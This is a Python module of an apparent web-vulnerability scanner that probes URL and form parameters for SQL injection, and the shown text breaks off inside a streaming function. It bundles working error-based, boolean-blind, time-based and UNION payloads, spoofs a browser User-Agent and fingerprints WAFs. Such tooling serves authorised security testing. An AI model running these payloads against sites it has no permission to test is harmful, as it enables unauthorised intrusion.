#!/usr/bin/env python3
"""
modules/sql_injection.py — v2.0.0
═══════════════════════════════════════════════════════════════════════════
Lightweight-but-professional SQL injection scanner.

Design goals
    • Zero-dependency on the heavy sqli_engine — fast, safe, low budget
    • Wordlist-driven (falls back to a bundled payload set)
    • Three techniques out of the box
        – error-based    (parse DB error signatures)
        – boolean-blind  (True vs False response comparison)
        – time-based     (statistical timing check)
    • Multi-DB dialect signatures (MySQL, MariaDB, PostgreSQL, MSSQL,
      Oracle, SQLite)
    • Baseline comparison + soft-404 handling to reduce false positives
    • Per-parameter dedup + confidence scoring (0.0–1.0)
    • WAF detection (informational, not blocking)
    • Token-bucket rate limiter, retry-with-backoff, per-request timeout
    • Cancel Event + progress callback + duration budget (SSE-ready)
    • Safe by design — never extracts data, only confirms the vulnerability

Compatibility
    • `run(target, mode="basic"|"expert", **kwargs)` → standard envelope
      consumed by `app.py` orchestrator and the Sniper adapter.
    • `run_sql_injection(url, method="GET", params=None)` → legacy shim
      kept for `modules/analytic_manager.py`.

CLI
    python -m modules.sql_injection https://example.com/page?id=1
    python -m modules.sql_injection https://example.com/page?id=1 --stream
    python -m modules.sql_injection --wordlists

Author: Yanxzyx
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import html
import json
import logging
import random
import re
import sys
import threading
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Set, Tuple

import requests
import urllib3
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter

try:
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    from requests.packages.urllib3.util.retry import Retry  # type: ignore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger("oxysintx.sql_injection")

__version__ = "2.0.0"
__author__ = "Yanxzyx"
__framework__ = "Oxysintx"

TOOL_INFO = {
    "name": "SQL Injection (Lightweight)",
    "version": __version__,
    "description": (
        "Fast SQL injection scanner. Basic: error-based + boolean-blind on "
        "the URL's query parameters. Expert: adds time-based detection with "
        "statistical timing. Safe by design — never dumps data."
    ),
    "category": "Web Vulnerability",
    "author": "Yanxzyx",
}


# ═══════════════════════════════════════════════════════════════════════════
# Paths & tunables
# ═══════════════════════════════════════════════════════════════════════════
_PROJECT_ROOT = Path(__file__).resolve().parent.parent
WORDLIST_DIR  = _PROJECT_ROOT / "wordlist"

DEFAULT_TIMEOUT       = 6.0
DEFAULT_RATE_LIMIT    = 25.0
DEFAULT_CONCURRENCY   = 6
DEFAULT_MAX_PARAMS    = 10
DEFAULT_MAX_DURATION  = 45.0
TIME_DELAY_SECONDS    = 3.0
TIME_DELAY_TOLERANCE  = 2.4
BOOLEAN_DIFF_MIN_PCT  = 12.0
BASELINE_SAMPLES      = 2
MAX_RESPONSE_BYTES    = 65536
MIN_ACCEPTABLE_LINES  = 4

_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist manifest — filenames also used by git_scraper_wordlist.py
# ═══════════════════════════════════════════════════════════════════════════
WORDLISTS = {
    "error":   "sqli_error_based.txt",
    "boolean": None,                                 # bundled
    "time":    "sqli_time_based.txt",
    "union":   "sqli_union_select.txt",
    "auth":    "sqli_auth_bypass.txt",
    "generic": "sqli_seclists_generic.txt",
}


# ═══════════════════════════════════════════════════════════════════════════
# Bundled fallback payloads
# ═══════════════════════════════════════════════════════════════════════════
_BUNDLED_ERROR: List[str] = [
    "'",
    "\"",
    "'--",
    "\"--",
    "'#",
    "')",
    "')--",
    "';",
    "' OR '1'='1",
    "' AND '1'='2",
    "') OR ('1'='1",
    "1' AND extractvalue(1,concat(0x7e,version()))--",
    "1' AND updatexml(1,concat(0x7e,version()),1)--",
    "1 AND 1=convert(int,@@version)--",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
]

_BUNDLED_BOOLEAN_TRUE: List[str] = [
    "' AND '1'='1",
    "' AND 1=1--",
    "' AND 'a'='a",
    "\" AND \"1\"=\"1",
    "1 AND 1=1",
    "') AND ('1'='1",
]

_BUNDLED_BOOLEAN_FALSE: List[str] = [
    "' AND '1'='2",
    "' AND 1=2--",
    "' AND 'a'='b",
    "\" AND \"1\"=\"2",
    "1 AND 1=2",
    "') AND ('1'='2",
]

_BUNDLED_TIME: List[str] = [
    "' AND SLEEP(3)--",
    "' AND SLEEP(3)#",
    "\" AND SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "1 AND SLEEP(3)--",
    "'; SELECT pg_sleep(3)--",
    "' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    "' AND randomblob(100000000)--",
]

_BUNDLED_UNION: List[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION SELECT 1,2,3--",
]


# ═══════════════════════════════════════════════════════════════════════════
# Error signatures by database dialect
# ═══════════════════════════════════════════════════════════════════════════
_DB_SIGNATURES: Dict[str, List[str]] = {
    "MySQL": [
        r"You have an error in your SQL syntax",
        r"Warning:\s+mysql_",
        r"MySQLSyntaxErrorException",
        r"check the manual that corresponds to your MySQL",
        r"check the manual that corresponds to your MariaDB",
        r"com\.mysql\.jdbc",
    ],
    "MariaDB": [
        r"check the manual that corresponds to your MariaDB",
        r"MariaDB server version",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"pg_query\(\)",
        r"PG::SyntaxError",
        r"unterminated quoted string at or near",
        r"WARNING:\s+pg_",
        r"org\.postgresql\.util\.PSQLException",
    ],
    "MSSQL": [
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Server.*Driver",
        r"System\.Data\.SqlClient\.SqlException",
        r"Incorrect syntax near",
        r"ODBC SQL Server Driver",
    ],
    "Oracle": [
        r"ORA-\d{5}",
        r"Oracle error",
        r"quoted string not properly terminated",
        r"oracle\.jdbc",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"unrecognized token",
    ],
}

_WAF_SIGNATURES: Dict[str, List[str]] = {
    "Cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF":     ["awselb", "x-amz-cf-id", "x-amzn-requestid"],
    "ModSecurity": ["mod_security", "modsecurity"],
    "Sucuri":      ["sucuri", "x-sucuri-id"],
    "Incapsula":   ["incap_ses", "visid_incap", "incapsula"],
    "F5 BIG-IP":   ["bigipserver", "tscookie", "f5-"],
    "Wordfence":   ["wordfence"],
    "Barracuda":   ["barra_counter_session", "barracuda"],
}


# ═══════════════════════════════════════════════════════════════════════════
# Data structures
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class Finding:
    parameter: str
    technique: str              # error-based | boolean-blind | time-based | union-based
    payload: str
    status: str = "possible"    # confirmed | probable | possible
    confidence: float = 0.5
    db_hint: Optional[str] = None
    evidence: Dict[str, Any] = field(default_factory=dict)

    def to_public_dict(self) -> Dict[str, Any]:
        return {
            "parameter":  self.parameter,
            "technique":  self.technique,
            "payload":    self.payload,
            "status":     self.status,
            "confidence": round(self.confidence, 2),
            "db_hint":    self.db_hint,
            "evidence":   self.evidence,
        }


@dataclass
class ScanReport:
    url: str
    started_at: str
    finished_at: str = ""
    elapsed: float = 0.0
    requests_sent: int = 0
    parameters_tested: List[str] = field(default_factory=list)
    techniques_tested: List[str] = field(default_factory=list)
    waf_detected: Optional[str] = None
    findings: List[Finding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    vulnerable: bool = False
    cancelled: bool = False

    def to_public_dict(self) -> Dict[str, Any]:
        return {
            "scanned":            self.url,
            "url":                self.url,
            "started_at":         self.started_at,
            "finished_at":        self.finished_at,
            "elapsed":            round(self.elapsed, 2),
            "requests_sent":      self.requests_sent,
            "payloads_tested":    self.requests_sent,     # legacy key
            "parameters_tested":  self.parameters_tested,
            "techniques_tested":  self.techniques_tested,
            "waf_detected":       self.waf_detected,
            "vulnerable":         self.vulnerable,
            "cancelled":          self.cancelled,
            "findings":           [f.to_public_dict() for f in self.findings],
            "errors":             self.errors[:10],
            "scan_type":          "sqli",
            "version":            __version__,
        }


# ═══════════════════════════════════════════════════════════════════════════
# Wordlist loading
# ═══════════════════════════════════════════════════════════════════════════
_wordlist_cache: Dict[str, List[str]] = {}
_wordlist_lock = threading.RLock()


def _filter_line(line: str) -> Optional[str]:
    s = line.strip()
    if not s or s.startswith(("#", "//", ";")):
        return None
    if len(s) > 512:
        return None
    return s


def load_wordlist(name: Optional[str], bundled: List[str],
                  max_lines: int = 60) -> List[str]:
    """Load a wordlist from disk if present, else return the bundled set."""
    if not name:
        return bundled[:max_lines]

    with _wordlist_lock:
        if name in _wordlist_cache:
            return _wordlist_cache[name][:max_lines]

        base = Path(name).name
        target = (WORDLIST_DIR / base).resolve()
        try:
            target.relative_to(WORDLIST_DIR.resolve())
        except ValueError:
            return bundled[:max_lines]

        if target.exists() and target.stat().st_size > 0:
            try:
                lines: List[str] = []
                with target.open("r", encoding="utf-8", errors="replace") as f:
                    for raw in f:
                        s = _filter_line(raw)
                        if s:
                            lines.append(s)
                        if len(lines) >= max_lines:
                            break
                if len(lines) >= MIN_ACCEPTABLE_LINES:
                    _wordlist_cache[name] = lines
                    return lines
            except OSError:
                pass

        return bundled[:max_lines]


def ensure_wordlists() -> Dict[str, Any]:
    out: Dict[str, Any] = {"wordlists": [], "version": __version__}
    for key, fname in WORDLISTS.items():
        bundled = (
            _BUNDLED_ERROR if key == "error"
            else _BUNDLED_TIME if key == "time"
            else _BUNDLED_UNION if key == "union"
            else []
        )
        entries = load_wordlist(fname, bundled, max_lines=200)
        p = (WORDLIST_DIR / fname) if fname else None
        out["wordlists"].append({
            "key":   key,
            "name":  fname or "(bundled)",
            "count": len(entries),
            "path":  str(p) if p else None,
            "exists": bool(p and p.exists() and p.stat().st_size > 0),
        })
    return out


# ═══════════════════════════════════════════════════════════════════════════
# Token-bucket rate limiter
# ═══════════════════════════════════════════════════════════════════════════
class _TokenBucket:
    def __init__(self, rate: float, burst: int = 4):
        self.rate   = max(0.1, float(rate))
        self.burst  = max(1, int(burst))
        self._tokens = float(self.burst)
        self._last   = time.monotonic()
        self._lock   = threading.Lock()

    def acquire(self, timeout: float = 15.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._lock:
                now = time.monotonic()
                self._tokens = min(self.burst,
                                   self._tokens + (now - self._last) * self.rate)
                self._last = now
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return True
                wait = (1.0 - self._tokens) / self.rate
            time.sleep(min(wait, 0.2))
        return False


# ═══════════════════════════════════════════════════════════════════════════
# HTTP session builder
# ═══════════════════════════════════════════════════════════════════════════
def _build_session(headers: Optional[Dict[str, str]] = None,
                   cookies: Optional[Dict[str, str]] = None,
                   proxies: Optional[Dict[str, str]] = None) -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(
        pool_connections=16, pool_maxsize=32,
        max_retries=Retry(
            total=1, backoff_factor=0.3,
            status_forcelist=(502, 503, 504),
            allowed_methods=frozenset(["GET", "POST"]),
            raise_on_status=False,
        ),
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({
        "User-Agent": _USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    })
    if headers:
        s.headers.update(headers)
    if cookies:
        s.cookies.update(cookies)
    if proxies:
        s.proxies.update(proxies)
    return s


def _read_capped(r: requests.Response, cap: int = MAX_RESPONSE_BYTES) -> str:
    buf = b""
    try:
        for chunk in r.iter_content(chunk_size=4096):
            buf += chunk
            if len(buf) >= cap:
                break
    except Exception:
        pass
    finally:
        try:
            r.close()
        except Exception:
            pass
    try:
        return buf.decode("utf-8", errors="replace")
    except Exception:
        return buf.decode("latin-1", errors="replace")


# ═══════════════════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════════════════
def _body_fingerprint(status: int, body: str) -> Tuple[int, int, str]:
    return (status, len(body),
            hashlib.md5(body.encode("utf-8", "ignore")).hexdigest()[:16])


def _detect_waf(headers: Dict[str, str], body: str) -> Optional[str]:
    hay = (" ".join(f"{k}: {v}" for k, v in headers.items())
           + " " + body[:4000]).lower()
    for name, sigs in _WAF_SIGNATURES.items():
        if any(sig.lower() in hay for sig in sigs):
            return name
    return None


def _extract_error_evidence(body: str) -> Tuple[Optional[str], Optional[str]]:
    for db, patterns in _DB_SIGNATURES.items():
        for pattern in patterns:
            m = re.search(pattern, body, re.I)
            if m:
                return db, m.group(0)[:160]
    return None, None


def _normalize_html(body: str) -> str:
    """Strip volatile tokens so similarity comparisons are stable."""
    if not body:
        return ""
    t = re.sub(r"<script[^>]*>.*?</script>", "", body, flags=re.S | re.I)
    t = re.sub(r"<style[^>]*>.*?</style>",   "", t,   flags=re.S | re.I)
    # CSRF tokens, timestamps, nonce
    t = re.sub(r'name=["\'](?:csrf|_token|nonce|__RequestVerificationToken)["\'][^>]*value=["\'][^"\']*["\']',
               "", t, flags=re.I)
    t = re.sub(r"\b\d{10,13}\b", "", t)
    t = re.sub(r"\s+", " ", t).strip()
    return t


def _similarity(a: str, b: str) -> float:
    """Character-bigram Jaccard approximation (0.0 – 1.0)."""
    if a == b: return 1.0
    if not a or not b: return 0.0
    def grams(s):
        s = s.lower()
        return {s[i:i+2] for i in range(len(s) - 1)} if len(s) > 1 else {s}
    g1, g2 = grams(a), grams(b)
    if not g1 or not g2: return 0.0
    inter = len(g1 & g2); union = len(g1 | g2)
    return inter / union if union else 0.0


def _discover_params(url: str, session: requests.Session,
                     timeout: float = 6.0) -> List[str]:
    """Extract query-string params, HTML form field names, common fallbacks."""
    out: List[str] = []
    seen: Set[str] = set()

    def add(p: str) -> None:
        p = (p or "").strip()
        if p and p not in seen and len(p) <= 64:
            seen.add(p); out.append(p)

    try:
        parsed = urllib.parse.urlparse(url)
        for k, _ in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
            add(k)
    except Exception:
        pass

    try:
        r = session.get(url, timeout=timeout, verify=False)
        if r.status_code < 400:
            soup = BeautifulSoup(r.text, "html.parser")
            for inp in soup.find_all(["input", "textarea", "select"]):
                add(inp.get("name"))
    except Exception:
        pass

    if not out:
        out = ["id", "q", "search", "query", "page", "cat", "item",
               "product", "user", "username", "email", "name", "sort"]
    return out[:40]


# ═══════════════════════════════════════════════════════════════════════════
# Scanner
# ═══════════════════════════════════════════════════════════════════════════
class SqlInjectionScanner:
    def __init__(
        self,
        *,
        timeout: float = DEFAULT_TIMEOUT,
        rate_limit: float = DEFAULT_RATE_LIMIT,
        concurrency: int = DEFAULT_CONCURRENCY,
        max_duration: float = DEFAULT_MAX_DURATION,
        cancel_event: Optional[threading.Event] = None,
        progress_cb: Optional[Callable[[int, int, str], None]] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        proxies: Optional[Dict[str, str]] = None,
    ):
        self.timeout      = float(timeout)
        self.bucket       = _TokenBucket(rate=rate_limit, burst=4)
        self.concurrency  = max(1, min(int(concurrency), 16))
        self.max_duration = float(max_duration)
        self._stop        = cancel_event or threading.Event()
        self._progress_cb = progress_cb
        self.method       = method.upper()
        self._session     = _build_session(headers, cookies, proxies)

        self._req_count   = 0
        self._req_lock    = threading.Lock()
        self._done        = 0
        self._total       = 0
        self._started     = 0.0
        self._baseline_fp: Optional[Tuple[int, int, str]] = None
        self._baseline_body_norm: str = ""
        self._baseline_time: float = 0.0

    # ── Lifecycle ──────────────────────────────────────────────────────
    def cancel(self) -> None:
        self._stop.set()

    def _budget_exceeded(self) -> bool:
        return (time.monotonic() - self._started) > self.max_duration

    def _emit(self, label: str = "") -> None:
        if not self._progress_cb: return
        try:
            self._progress_cb(self._done, self._total, label)
        except Exception:
            pass

    # ── Low-level send ─────────────────────────────────────────────────
    def _send(self, url: str, param: str, payload: str,
              use_post: bool = False) -> Optional[Dict[str, Any]]:
        if self._stop.is_set() or self._budget_exceeded():
            return None
        if not self.bucket.acquire(timeout=15.0):
            return None

        t0 = time.monotonic()
        try:
            if use_post:
                r = self._session.post(url, data={param: payload},
                                       timeout=self.timeout, verify=False,
                                       allow_redirects=False, stream=True)
            else:
                r = self._session.get(url, params={param: payload},
                                      timeout=self.timeout, verify=False,
                                      allow_redirects=False, stream=True)
            body = _read_capped(r)
            elapsed = time.monotonic() - t0
            with self._req_lock:
                self._req_count += 1
            return {"status": r.status_code,
                    "headers": dict(r.headers),
                    "body": body, "elapsed": elapsed}
        except requests.exceptions.Timeout:
            return {"status": 0, "headers": {}, "body": "",
                    "elapsed": time.monotonic() - t0, "timeout": True}
        except requests.exceptions.RequestException:
            return None

    # ── Baseline ───────────────────────────────────────────────────────
    def establish_baseline(self, url: str, param: str) -> bool:
        marker = f"oxi{uuid.uuid4().hex[:8]}"
        samples: List[Dict[str, Any]] = []
        for _ in range(BASELINE_SAMPLES):
            r = self._send(url, param, marker, use_post=(self.method == "POST"))
            if r is None: return False
            samples.append(r)

        first = samples[0]
        self._baseline_fp = _body_fingerprint(first["status"], first["body"])
        self._baseline_body_norm = _normalize_html(first["body"])
        self._baseline_time = sum(s["elapsed"] for s in samples) / len(samples)
        return True

    # ── Techniques ─────────────────────────────────────────────────────
    def _test_error_based(self, url: str, param: str,
                          payloads: List[str]) -> Optional[Finding]:
        for payload in payloads:
            if self._stop.is_set() or self._budget_exceeded():
                return None
            resp = self._send(url, param, payload,
                              use_post=(self.method == "POST"))
            self._done += 1
            if resp is None: continue

            db, sig = _extract_error_evidence(resp["body"])
            # The baseline must NOT already contain this signature
            base_db, _ = _extract_error_evidence(
                self._baseline_body_norm or "")
            if db and db != base_db:
                return Finding(
                    parameter=param,
                    technique="error-based",
                    payload=payload,
                    status="confirmed",
                    confidence=0.95,
                    db_hint=db,
                    evidence={
                        "type":      "db_error_signature",
                        "db":        db,
                        "signature": sig,
                        "status":    resp["status"],
                    },
                )
        return None

    def _test_boolean_blind(self, url: str, param: str,
                            true_payloads: List[str],
                            false_payloads: List[str]) -> Optional[Finding]:
        pairs = list(zip(true_payloads, false_payloads))
        if not pairs: return None

        for true_pl, false_pl in pairs:
            if self._stop.is_set() or self._budget_exceeded():
                return None

            rt = self._send(url, param, true_pl,  use_post=(self.method == "POST"))
            rf = self._send(url, param, false_pl, use_post=(self.method == "POST"))
            self._done += 2
            if rt is None or rf is None: continue

            fp_t = _body_fingerprint(rt["status"], rt["body"])
            fp_f = _body_fingerprint(rf["status"], rf["body"])

            # Same status, different hash, meaningful length delta
            if fp_t[0] != fp_f[0] or fp_t[2] == fp_f[2]:
                continue

            len_delta_pct = (
                abs(fp_t[1] - fp_f[1]) / max(fp_t[1], fp_f[1], 1)
            ) * 100.0
            if len_delta_pct < BOOLEAN_DIFF_MIN_PCT and fp_t[1] == fp_f[1]:
                continue

            # Verify — the True/False fingerprints must be reproducible
            rt2 = self._send(url, param, true_pl,  use_post=(self.method == "POST"))
            rf2 = self._send(url, param, false_pl, use_post=(self.method == "POST"))
            self._done += 2
            if rt2 is None or rf2 is None: continue

            fp_t2 = _body_fingerprint(rt2["status"], rt2["body"])
            fp_f2 = _body_fingerprint(rf2["status"], rf2["body"])

            if fp_t[2] != fp_t2[2]:  continue
            if fp_f[2] != fp_f2[2]:  continue
            if fp_t2[2] == fp_f2[2]: continue

            return Finding(
                parameter=param,
                technique="boolean-blind",
                payload=true_pl,
                status="confirmed",
                confidence=0.88,
                evidence={
                    "type":         "boolean_diff",
                    "true_hash":    fp_t[2],
                    "false_hash":   fp_f[2],
                    "true_len":     fp_t[1],
                    "false_len":    fp_f[1],
                    "diff_pct":     round(len_delta_pct, 1),
                },
            )
        return None

    def _test_time_based(self, url: str, param: str,
                         payloads: List[str]) -> Optional[Finding]:
        if self._baseline_time <= 0:
            return None

        for payload in payloads:
            if self._stop.is_set() or self._budget_exceeded():
                return None

            r1 = self._send(url, param, payload, use_post=(self.method == "POST"))
            self._done += 1
            if r1 is None: continue
            delay1 = r1["elapsed"] - self._baseline_time
            if delay1 < TIME_DELAY_TOLERANCE: continue

            r2 = self._send(url, param, payload, use_post=(self.method == "POST"))
            self._done += 1
            if r2 is None: continue
            delay2 = r2["elapsed"] - self._baseline_time
            if delay2 < TIME_DELAY_TOLERANCE: continue

            avg = (delay1 + delay2) / 2.0
            return Finding(
                parameter=param,
                technique="time-based",
                payload=payload,
                status="confirmed",
                confidence=0.90,
                evidence={
                    "type":        "reproduced_delay",
                    "baseline_s":  round(self._baseline_time, 2),
                    "attempt1_s":  round(r1["elapsed"], 2),
                    "attempt2_s":  round(r2["elapsed"], 2),
                    "avg_delay_s": round(avg, 2),
                },
            )
        return None

    # ── Full scan ──────────────────────────────────────────────────────
    def scan(
        self,
        url: str,
        *,
        params: Optional[List[str]] = None,
        techniques: Optional[List[str]] = None,
        max_params: int = DEFAULT_MAX_PARAMS,
    ) -> ScanReport:
        started = datetime.now(timezone.utc)
        self._started = time.monotonic()
        report = ScanReport(url=url, started_at=started.isoformat())

        error_pls = load_wordlist(WORDLISTS["error"],   _BUNDLED_ERROR, 60)
        time_pls  = load_wordlist(WORDLISTS["time"],    _BUNDLED_TIME,  40)
        union_pls = load_wordlist(WORDLISTS["union"],   _BUNDLED_UNION, 40)
        true_pls  = _BUNDLED_BOOLEAN_TRUE
        false_pls = _BUNDLED_BOOLEAN_FALSE

        techniques = techniques or ["error", "boolean", "time"]
        report.techniques_tested = list(techniques)

        # Parameter discovery
        if params is None:
            params = _discover_params(url, self._session, timeout=self.timeout)
        params = params[:max_params]
        report.parameters_tested = list(params)
        if not params:
            report.errors.append("no parameters to test")
            report.finished_at = datetime.now(timezone.utc).isoformat()
            report.elapsed = time.monotonic() - self._started
            return report

        # Baseline
        if not self.establish_baseline(url, params[0]):
            report.errors.append("baseline request failed")
            report.finished_at = datetime.now(timezone.utc).isoformat()
            report.elapsed = time.monotonic() - self._started
            return report

        # WAF detection
        try:
            r = self._session.get(url, timeout=self.timeout, verify=False)
            report.waf_detected = _detect_waf(dict(r.headers), r.text or "")
        except Exception:
            report.waf_detected = None

        self._total = len(params) * len(techniques)
        self._done  = 0

        findings: List[Finding] = []
        seen_keys: Set[str] = set()
        findings_lock = threading.Lock()

        def _dedup_add(f: Finding) -> None:
            key = (f.parameter, f.technique, f.db_hint or "")
            if key in seen_keys:
                return
            seen_keys.add(key)
            findings.append(f)

        def worker(param: str) -> None:
            if self._stop.is_set() or self._budget_exceeded():
                return
            local: List[Finding] = []

            if "error" in techniques:
                f = self._test_error_based(url, param, error_pls)
                if f: local.append(f)

            if "boolean" in techniques:
                f = self._test_boolean_blind(url, param, true_pls, false_pls)
                if f: local.append(f)

            if "time" in techniques:
                f = self._test_time_based(url, param, time_pls)
                if f: local.append(f)

            if "union" in techniques:
                # lightweight union check — reuse boolean-diff signal
                f = self._test_boolean_blind(url, param, union_pls, false_pls[:len(union_pls)])
                if f:
                    f.technique = "union-based"
                    f.confidence = min(f.confidence, 0.75)
                    f.status = "probable"
                    local.append(f)

            with findings_lock:
                for f in local:
                    _dedup_add(f)

            self._emit(param)

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.concurrency
        ) as pool:
            futures = [pool.submit(worker, p) for p in params]
            for fut in concurrent.futures.as_completed(futures):
                if self._stop.is_set() or self._budget_exceeded():
                    for f in futures: f.cancel()
                    break
                try:
                    fut.result()
                except Exception:
                    continue

        findings.sort(key=lambda f: -f.confidence)
        report.findings         = findings
        report.vulnerable       = any(f.confidence >= 0.7 for f in findings)
        report.requests_sent    = self._req_count
        report.cancelled        = self._stop.is_set()
        report.finished_at      = datetime.now(timezone.utc).isoformat()
        report.elapsed          = time.monotonic() - self._started
        return report


# ═══════════════════════════════════════════════════════════════════════════
# Public API
# ═══════════════════════════════════════════════════════════════════════════
def _normalise_url(target: str) -> str:
    t = (target or "").strip()
    if not t:
        raise ValueError("target is required")
    if not t.lower().startswith(("http://", "https://")):
        t = "http://" + t
    return t


def _normalise_options(options: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    options = options or {}

    def _i(key, default, lo, hi):
        try: return max(lo, min(hi, int(options.get(key, default))))
        except (TypeError, ValueError): return default

    def _f(key, default, lo, hi):
        try: return max(lo, min(hi, float(options.get(key, default))))
        except (TypeError, ValueError): return default

    return {
        "techniques":   options.get("techniques") or ["error", "boolean", "time"],
        "params":       options.get("params") or None,
        "max_params":   _i("max_params", DEFAULT_MAX_PARAMS, 1, 40),
        "concurrency":  _i("concurrency", DEFAULT_CONCURRENCY, 1, 16),
        "rate_limit":   _f("rate_limit", DEFAULT_RATE_LIMIT, 1.0, 100.0),
        "timeout":      _f("timeout", DEFAULT_TIMEOUT, 2.0, 30.0),
        "max_duration": _f("max_duration", DEFAULT_MAX_DURATION, 5.0, 300.0),
        "method":       (options.get("method") or "GET").upper(),
        "headers":      options.get("headers") or None,
        "cookies":      options.get("cookies") or None,
        "proxies":      options.get("proxies") or None,
        "cancel_event": options.get("cancel_event"),
        "progress_cb":  options.get("progress_cb"),
    }


def run_sql_injection(
    url: str,
    method: str = "GET",
    params: Optional[Dict[str, Any]] = None,
    *,
    techniques: Optional[List[str]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    rate_limit: float = DEFAULT_RATE_LIMIT,
    max_duration: float = DEFAULT_MAX_DURATION,
    headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
    **kwargs,
) -> Dict[str, Any]:
    """
    Legacy entry point — kept for ``modules/analytic_manager.py``.

    Returns a dict with all the original keys (``scanned``, ``payloads_tested``,
    ``findings``, ``vulnerable``) plus the richer professional report.
    """
    url = _normalise_url(url)
    param_list: Optional[List[str]] = None
    if isinstance(params, dict) and params:
        param_list = list(params.keys())

    scanner = SqlInjectionScanner(
        timeout=timeout,
        rate_limit=rate_limit,
        max_duration=max_duration,
        method=method,
        headers=headers,
        cookies=cookies,
        proxies=proxies,
    )
    report = scanner.scan(
        url,
        params=param_list,
        techniques=techniques or ["error", "boolean", "time"],
    )
    return report.to_public_dict()


def run(target: str, mode: str = "basic", **kwargs) -> Dict[str, Any]:
    """
    Orchestrator entry point (used by ``app.py`` and Sniper).

    Basic  : error + boolean  (fast, low budget).
    Expert : error + boolean + time-based statistical.
    """
    url = _normalise_url(target)

    if mode == "expert":
        techniques = ["error", "boolean", "time"]
        max_params = int(kwargs.get("max_params", 12))
    else:
        techniques = ["error", "boolean"]
        max_params = int(kwargs.get("max_params", 8))

    try:
        data = run_sql_injection(
            url,
            method=str(kwargs.get("method", "GET")),
            params=kwargs.get("params"),
            techniques=techniques,
            timeout=float(kwargs.get("timeout", DEFAULT_TIMEOUT)),
            rate_limit=float(kwargs.get("rate_limit", DEFAULT_RATE_LIMIT)),
            max_duration=float(kwargs.get("max_duration", DEFAULT_MAX_DURATION)),
            headers=kwargs.get("headers"),
            cookies=kwargs.get("cookies"),
            proxies=kwargs.get("proxies"),
        )
        data["mode"]   = mode
        data["max_params"] = max_params

        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        top_sev, top_rank = "safe", 0
        for f in data.get("findings", []):
            conf = f.get("confidence", 0)
            sev = ("critical" if conf >= 0.95
                   else "high" if conf >= 0.8
                   else "medium" if conf >= 0.6
                   else "low")
            if sev_rank.get(sev, 0) > top_rank:
                top_rank, top_sev = sev_rank[sev], sev

        data["severity"] = top_sev if data.get("vulnerable") else "safe"
        data["summary"] = (
            f"{len(data.get('findings', []))} SQL injection point(s) found"
            if data.get("vulnerable")
            else "No SQL injection detected"
        )
        return {
            "tool":    "sql_injection",
            "version": __version__,
            "target":  target,
            "data":    data,
            "error":   None,
        }
    except Exception as e:
        logger.error("sql_injection run() failed for %s: %s", url, e, exc_info=True)
        return {
            "tool":    "sql_injection",
            "version": __version__,
            "target":  target,
            "data":    {"url": url, "scan_type": "sqli",
                        "vulnerable": False, "findings": []},
            "error":   str(e),
        }


# ═══════════════════════════════════════════════════════════════════════════
# Streaming API (SSE-ready)
# ═══════════════════════════════════════════════════════════════════════════
def run_streaming(
    url: str,
    options: Optional[Dict[str, Any]] = None,
    cancel_event: Optional[threading.Event] = None,
) -> Iterator[Dict[str, Any]]:
    o = _normalise_options(options)
    if cancel_event is not None:
        o["cancel_event"] = cancel_event

    events: List[Dict[str, Any]] = []
    events_lock = threading.Lock()
    done = threading.Event()
    holder: Dict[str, Any] = {}

    def _progress(done_count: int, total: int, label: str) -> None:
        pct = int((done_count / total) * 100) if total else 0
        with events_lock:
            events.append({
                "type":    "progress",
                "done":    done_count,
                "total":   total,
                "percent": pct,
                "label":   label,
            })

    o["progress_cb"] = _progress

    def _worker() -> None:
        try:
            holder["result"] = run_sql_injection(
                url,
                method=o["method"],
                params=o["params"],
                techniques=o["techniques"],
                timeout=o["timeout"],
                rate_limit=o["rate_limit"],
                max_duration=o["max_duration"],
                headers=o["headers"],
                cookies=o["cookies"],
                proxies=o["proxies"],
            )
        except Exception as e:
            holder["error"] = str(e)
        finally:
            done.set()

